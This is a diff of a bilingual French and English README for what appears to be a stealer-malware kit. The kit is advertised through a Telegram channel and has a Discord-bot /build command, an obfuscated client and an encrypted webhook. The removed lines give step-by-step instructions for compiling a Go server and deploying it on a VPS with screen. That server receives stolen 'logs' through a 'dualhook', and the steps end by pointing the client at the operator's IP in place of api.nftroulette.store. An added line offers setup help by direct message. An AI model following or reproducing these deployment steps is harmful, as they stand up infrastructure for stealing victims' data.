@@ -43,25 +43,13 @@ verified roles: "customers roles"
 
 /build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot
 
-pour build une api (recevoir les logs et avoir un dualhook)
-téléchargher golang
-il faut que vous aller sur votre bureau windows que vous prenez le dossier "Api"
-vous allez dedans vous cliquer sur main.go et vous modifier le dualwebhook avec le votre.
-enregistrer et aller sur votre barre de recherche en haut et faite cmd
-taper ceci:
-set GOOS=linux
-go build -ldflags "-s -w" main.go
-prenez le fichier main qui a été build et mettez le sur votre vps dans le dossier "Api"
-faites cd Api
-chmod 777 main
-screen -dmS Api ./main
-maitenant faites ctrl + A + D et votre Api est en ligne vous avez juste a allez dans build.js dans "ClientObf" et modifier l'encryptedWebhook remplacer api.nftroulette.store par votre ip de vps et voila !
 
 Ne pas edit la config de build.js sinon plus rien ne marchera
 
 official 1336 Channel
 https://t.me/St34ler
 
+dm @darkgram2 for setup help
 
 -----------------------------------------------------------------------
 English
@@ -105,22 +93,10 @@ verified roles: "customers roles"
 
 /build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot
 
-To build an API (receive logs and have a dualhook)
-Download Golang
-you need to go to your windows desktop as you take the "Api" folder
-In this you will click on main.go and you will change the dualwebhook with yours.
-Save and go to your search bar at the top and do cmd
-Type this:
-set GOOS=linux
-go build -ldflags "-s -w" main.go
-Take the main file that was built and put it on your VPS in the "Api" folder
-make cd Api
-CHMOD 777 Main
-screen -dmS API ./main
-Now do ctrl + A + D and your API is up and running, you just have to go to build.js in "ClientObf" and modify the encryptedWebhook, replace api.nftroulette.store with your vps ip and that done!
-
 
 don't edit build.js or nothing will be work
 
 official 1336 Channel
 https://t.me/St34ler
+
+dm @darkgram2 for setup help
